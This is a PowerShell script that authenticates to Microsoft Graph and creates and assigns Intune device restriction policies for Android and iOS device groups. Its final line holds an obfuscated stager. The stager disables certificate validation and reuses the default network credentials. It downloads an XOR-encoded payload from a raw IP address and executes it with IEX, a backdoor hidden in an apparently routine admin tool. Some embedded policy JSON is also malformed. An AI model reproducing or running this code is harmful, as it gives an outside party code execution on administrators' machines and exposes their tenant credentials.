function Get-AuthToken {[cmdletbinding()]param([Parameter(Mandatory=$true)]$User)$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User$tenant = $userUpn.HostWrite-Host "Checking for AzureAD module..."$AadModule = Get-Module -Name "AzureAD" -ListAvailableif ($AadModule -eq $null) {Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"$AadModule = Get-Module -Name "AzureADPreview" -ListAvailable}if ($AadModule -eq $null) {write-hostwrite-host "AzureAD Powershell module not installed..." -f Redwrite-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellowwrite-host "Script can't continue..." -f Redwrite-hostexit}if($AadModule.count -gt 1){$Latest_Version = ($AadModule | select version | Sort-Object)[-1]$aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }if($AadModule.count -gt 1){$aadModule = $AadModule | select -Unique}$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}else {$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"$redirectUri = "urn:ietf:wg:oauth:2.0:oob"$resourceAppIdURI = "https://graph.microsoft.com"$authority = "https://login.microsoftonline.com/$Tenant"try {$authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority$platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"$userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")$authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Resultif($authResult.AccessToken){$authHeader = @{'Content-Type'='application/json''Authorization'="Bearer " + $authResult.AccessToken'ExpiresOn'=$authResult.ExpiresOn}return $authHeader}else {Write-HostWrite-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor RedWrite-Hostbreak}}catch {write-host $_.Exception.Message -f Redwrite-host $_.Exception.ItemName -f Redwrite-hostbreak}}Function Add-DeviceConfigurationPolicy(){[cmdletbinding()]param($JSON)$graphApiVersion = "Beta"$DCP_resource = "deviceManagement/deviceConfigurations"Write-Verbose "Resource: $DCP_resource"try {if($JSON -eq "" -or $JSON -eq $null){write-host "No JSON specified, please specify valid JSON for the Android Policy..." -f Red}else {Test-JSON -JSON $JSON$uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)"Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $JSON -ContentType "application/json"}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Add-DeviceConfigurationPolicyAssignment(){[cmdletbinding()]param($ConfigurationPolicyId,$TargetGroupId)$graphApiVersion = "Beta"$Resource = "deviceManagement/deviceConfigurations/$ConfigurationPolicyId/assign"try {if(!$ConfigurationPolicyId){write-host "No Configuration Policy Id specified, specify a valid Configuration Policy Id" -f Redbreak}if(!$TargetGroupId){write-host "No Target Group Id specified, specify a valid Target Group Id" -f Redbreak}$ConfPolAssign = "$ConfigurationPolicyId" + "_" + "$TargetGroupId"$JSON = @"{"deviceConfigurationGroupAssignments": [{"@odata.type": ""id": "$ConfPolAssign","targetGroupId": "$TargetGroupId"}]}"@$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $JSON -ContentType "application/json"}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Test-JSON(){param ($JSON)try {$TestJSON = ConvertFrom-Json $JSON -ErrorAction Stop$validJson = $true}catch {$validJson = $false$_.Exception}if (!$validJson){Write-Host "Provided JSON isn't in valid JSON format" -f Redbreak}}Function Get-AADGroup(){[cmdletbinding()]param($GroupName,$id,[switch]$Members)$graphApiVersion = "v1.0"$Group_resource = "groups"try {if($id){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($GroupName -eq "" -or $GroupName -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}else {if(!$Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"$Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Valueif($Group){$GID = $Group.id$Group.displayNamewrite-host$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}write-hostif($global:authToken){$DateTime = (Get-Date).ToUniversalTime()$TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutesif($TokenExpires -le 0){write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellowwrite-hostif($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}}else {if($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}$iOS = @"{"@odata.type": ""description": "","displayName": "iOS Device Restriction Policy","accountBlockModification": false,"activationLockAllowWhenSupervised": false,"airDropBlocked": false,"airDropForceUnmanagedDropTarget": false,"airPlayForcePairingPasswordForOutgoingRequests": false,"appleWatchBlockPairing": false,"appleWatchForceWristDetection": false,"appleNewsBlocked": false,"appsSingleAppModeBundleIds": [],"appsVisibilityList": [],"appsVisibilityListType": "none","appStoreBlockAutomaticDownloads": false,"appStoreBlocked": false,"appStoreBlockInAppPurchases": false,"appStoreBlockUIAppInstallation": false,"appStoreRequirePassword": false,"bluetoothBlockModification": false,"cameraBlocked": false,"cellularBlockDataRoaming": false,"cellularBlockGlobalBackgroundFetchWhileRoaming": false,"cellularBlockPerAppDataModification": false,"cellularBlockVoiceRoaming": false,"certificatesBlockUntrustedTlsCertificates": false,"classroomAppBlockRemoteScreenObservation": false,"compliantAppsList": [],"compliantAppListType": "none","configurationProfileBlockChanges": false,"definitionLookupBlocked": false,"deviceBlockEnableRestrictions": false,"deviceBlockEraseContentAndSettings": false,"deviceBlockNameModification": false,"diagnosticDataBlockSubmission": false,"diagnosticDataBlockSubmissionModification": false,"documentsBlockManagedDocumentsInUnmanagedApps": false,"documentsBlockUnmanagedDocumentsInManagedApps": false,"emailInDomainSuffixes": [],"enterpriseAppBlockTrust": false,"enterpriseAppBlockTrustModification": false,"faceTimeBlocked": false,"findMyFriendsBlocked": false,"gamingBlockGameCenterFriends": true,"gamingBlockMultiplayer": false,"gameCenterBlocked": false,"hostPairingBlocked": false,"iBooksStoreBlocked": false,"iBooksStoreBlockErotica": false,"iCloudBlockActivityContinuation": false,"iCloudBlockBackup": true,"iCloudBlockDocumentSync": true,"iCloudBlockManagedAppsSync": false,"iCloudBlockPhotoLibrary": false,"iCloudBlockPhotoStreamSync": true,"iCloudBlockSharedPhotoStream": false,"iCloudRequireEncryptedBackup": false,"iTunesBlockExplicitContent": false,"iTunesBlockMusicService": false,"iTunesBlockRadio": false,"keyboardBlockAutoCorrect": false,"keyboardBlockPredictive": false,"keyboardBlockShortcuts": false,"keyboardBlockSpellCheck": false,"kioskModeAllowAssistiveSpeak": false,"kioskModeAllowAssistiveTouchSettings": false,"kioskModeAllowAutoLock": false,"kioskModeAllowColorInversionSettings": false,"kioskModeAllowRingerSwitch": false,"kioskModeAllowScreenRotation": false,"kioskModeAllowSleepButton": false,"kioskModeAllowTouchscreen": false,"kioskModeAllowVoiceOverSettings": false,"kioskModeAllowVolumeButtons": false,"kioskModeAllowZoomSettings": false,"kioskModeAppStoreUrl": null,"kioskModeRequireAssistiveTouch": false,"kioskModeRequireColorInversion": false,"kioskModeRequireMonoAudio": false,"kioskModeRequireVoiceOver": false,"kioskModeRequireZoom": false,"kioskModeManagedAppId": null,"lockScreenBlockControlCenter": false,"lockScreenBlockNotificationView": false,"lockScreenBlockPassbook": false,"lockScreenBlockTodayView": false,"mediaContentRatingAustralia": null,"mediaContentRatingCanada": null,"mediaContentRatingFrance": null,"mediaContentRatingGermany": null,"mediaContentRatingIreland": null,"mediaContentRatingJapan": null,"mediaContentRatingNewZealand": null,"mediaContentRatingUnitedKingdom": null,"mediaContentRatingUnitedStates": null,"mediaContentRatingApps": "allAllowed","messagesBlocked": false,"notificationsBlockSettingsModification": false,"passcodeBlockFingerprintUnlock": false,"passcodeBlockModification": false,"passcodeBlockSimple": true,"passcodeExpirationDays": null,"passcodeMinimumLength": 4,"passcodeMinutesOfInactivityBeforeLock": null,"passcodeMinutesOfInactivityBeforeScreenTimeout": null,"passcodeMinimumCharacterSetCount": null,"passcodePreviousPasscodeBlockCount": null,"passcodeSignInFailureCountBeforeWipe": null,"passcodeRequiredType": "deviceDefault","passcodeRequired": true,"podcastsBlocked": false,"safariBlockAutofill": false,"safariBlockJavaScript": false,"safariBlockPopups": false,"safariBlocked": false,"safariCookieSettings": "browserDefault","safariManagedDomains": [],"safariPasswordAutoFillDomains": [],"safariRequireFraudWarning": false,"screenCaptureBlocked": false,"siriBlocked": false,"siriBlockedWhenLocked": false,"siriBlockUserGeneratedContent": false,"siriRequireProfanityFilter": false,"spotlightBlockInternetResults": false,"voiceDialingBlocked": false,"wallpaperBlockModification": false}"@$Android = @"{"@odata.type": ""description": "","displayName": "Android Device Restriction Policy","appsBlockClipboardSharing": false,"appsBlockCopyPaste": false,"appsBlockYouTube": false,"bluetoothBlocked": false,"cameraBlocked": false,"cellularBlockDataRoaming": true,"cellularBlockMessaging": false,"cellularBlockVoiceRoaming": false,"cellularBlockWiFiTethering": false,"compliantAppsList": [],"compliantAppListType": "none","diagnosticDataBlockSubmission": false,"locationServicesBlocked": false,"googleAccountBlockAutoSync": false,"googlePlayStoreBlocked": false,"kioskModeBlockSleepButton": false,"kioskModeBlockVolumeButtons": false,"kioskModeManagedAppId": null,"nfcBlocked": false,"passwordBlockFingerprintUnlock": true,"passwordBlockTrustAgents": false,"passwordExpirationDays": null,"passwordMinimumLength": 4,"passwordMinutesOfInactivityBeforeScreenTimeout": null,"passwordPreviousPasswordBlockCount": null,"passwordSignInFailureCountBeforeFactoryReset": null,"passwordRequiredType": "deviceDefault","passwordRequired": true,"powerOffBlocked": false,"factoryResetBlocked": false,"screenCaptureBlocked": false,"deviceSharingBlocked": false,"storageBlockGoogleBackup": true,"storageBlockRemovableStorage": false,"storageRequireDeviceEncryption": true,"storageRequireRemovableStorageEncryption": true,"voiceAssistantBlocked": false,"voiceDialingBlocked": false,"webBrowserAllowPopups": false,"webBrowserBlockAutofill": false,"webBrowserBlockJavaScript": false,"webBrowserBlocked": false,"webBrowserCookieSettings": "browserDefault","wiFiBlocked": false}"@$AADGroup = Read-Host -Prompt "Enter the Azure AD Group name where policies will be assigned"$TargetGroupId = (get-AADGroup -GroupName "$AADGroup").idif($TargetGroupId -eq $null -or $TargetGroupId -eq ""){Write-Host "AAD Group - '$AADGroup' doesn't exist, please specify a valid AAD Group..." -ForegroundColor RedWrite-Hostexit}Write-Host "Adding Android Device Restriction Policy from JSON..." -ForegroundColor Yellow$CreateResult_Android = Add-DeviceConfigurationPolicy -JSON $AndroidWrite-Host "Device Restriction Policy created as" $CreateResult_Android.idwrite-hostwrite-host "Assigning Device Restriction Policy to AAD Group '$AADGroup'" -f Cyan$Assign_Android = Add-DeviceConfigurationPolicyAssignment -ConfigurationPolicyId $CreateResult_Android.id -TargetGroupId $TargetGroupIdWrite-Host "Assigned '$AADGroup' to $($CreateResult_Android.displayName)/$($CreateResult_Android.id)"Write-HostWrite-Host "Adding iOS Device Restriction Policy from JSON..." -ForegroundColor YellowWrite-Host$CreateResult_iOS = Add-DeviceConfigurationPolicy -JSON $iOSWrite-Host "Device Restriction Policy created as" $CreateResult_iOS.idwrite-hostwrite-host "Assigning Device Restriction Policy to AAD Group '$AADGroup'" -f Cyan$Assign_iOS = Add-DeviceConfigurationPolicyAssignment -ConfigurationPolicyId $CreateResult_iOS.id -TargetGroupId $TargetGroupIdWrite-Host "Assigned '$AADGroup' to $($CreateResult_iOS.displayName)/$($CreateResult_iOS.id)"Write-Host$WC=NEW-OBjECT SySteM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HEaDeRs.Add('User-Agent',$u);$Wc.ProxY = [SYstem.Net.WEbREqUESt]::DefaUlTWeBPrOXy;$wc.PRoxy.CRedeNtiAls = [SySteM.NET.CReDEntiALCaChe]::DEFaULTNETwoRkCREDEnTiaLS;$K='0qoga`PzyB\pse]{_iO.G*Dd>uN=x?:S';$i=0;[CHAr[]]$B=([ChAR[]]($wc.DownloaDStrInG("https://46.101.90.248:443/index.asp")))|%{$_-BXOr$k[$I++%$K.LengTh]};IEX ($b-joiN'')